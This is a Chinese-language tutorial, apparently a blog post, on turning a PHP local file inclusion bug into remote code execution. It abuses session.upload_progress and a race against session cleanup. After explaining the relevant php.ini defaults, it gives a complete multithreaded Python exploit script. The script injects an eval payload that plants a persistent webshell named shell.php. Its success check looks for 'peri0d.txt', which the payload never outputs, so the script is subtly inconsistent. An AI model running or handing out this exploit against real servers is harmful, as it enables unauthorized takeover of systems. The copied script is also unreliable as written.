## session.upload_progress进行文件包含

## 0x01 利用条件

```
php>5.4
```

这其中主要是有关于php.ini中的默认选项

```
1. session.upload_progress.enabled = on
2. session.upload_progress.cleanup = on
3. session.upload_progress.prefix = "upload_progress_"
4. session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
5. session.upload_progress.freq = "1%"
6. session.upload_progress.min_freq = "1"
```

![image-20210426231924787](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210426231924787.png)

下面依次来说一下，这几个的含义

```
1.enabled 将上传过程存储在session中
Enables upload progress tracking, populating the $_SESSION variable. Defaults to 1, enabled.
2.cleanup 上传完成之后就把上面session中的东西删除掉
3.name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；
prefix+name将表示为session中的键名
```

![image-20210426232318406](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210426232318406.png)

还有就是一个关键的配置

`session.use_strict_mode=off`表示上传中我们的sessionid可控

## 0X02 开始演示

![image-20210426232607264](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210426232607264.png)

现在我们拿到了这样一个页面，可以看到这其中是有一个叫做文件包含漏洞的。

但是我们没有上传的点，假装这里还有很多的过滤，那不就完蛋了吗？

**问题一**

代码里没有`session_start()`,如何创建session文件呢。

**解答一**

其实，如果`session.auto_start=On` ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。

但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get("session.upload_progress.prefix")+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。

**问题二**

但是问题来了，默认配置`session.upload_progress.cleanup = on`导致文件上传后，session文件内容立即清空，

**如何进行rce呢？**

**解答二**

此时我们可以利用竞争，在session文件内容清空前进行包含利用。

![image-20210426233631824](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210426233631824.png)

利用脚本

```
#coding=utf-8 
import io
import requests
import threading
import sys
sessid = 'demo'
data = {"cmd":"system('id');"} 
url = "http://test.com"
def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post( url, data={'PHP_SESSION_UPLOAD_PROGRESS': "<?php eval($_POST['cmd']);fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>');echo md5('1');?>"}, files={'file': ('demo.txt',f)}, cookies={'PHPSESSID': sessid} )
def read(session):
    while True:
        resp = session.post(url+'?file=../../Extensions/tmp/tmp/sess_'+sessid,data=data)
        if 'peri0d.txt' in resp.text:
        	print("[-]"+"*"*20+"success")
        	print(resp.text)
        	event.clear()
        	sys.exit(0)
        else:
        	print("[-]"+"*"*20+"try again")
if __name__=="__main__":
    event=threading.Event()
    with requests.session() as session:
        for i in range(1,30): 
            threading.Thread(target=write,args=(session,)).start()
        for i in range(1,30):
            threading.Thread(target=read,args=(session,)).start()
    event.set()

```

## 0x03 适用环境

有漏洞点，但是无漏洞文件，还可以用于反序列化。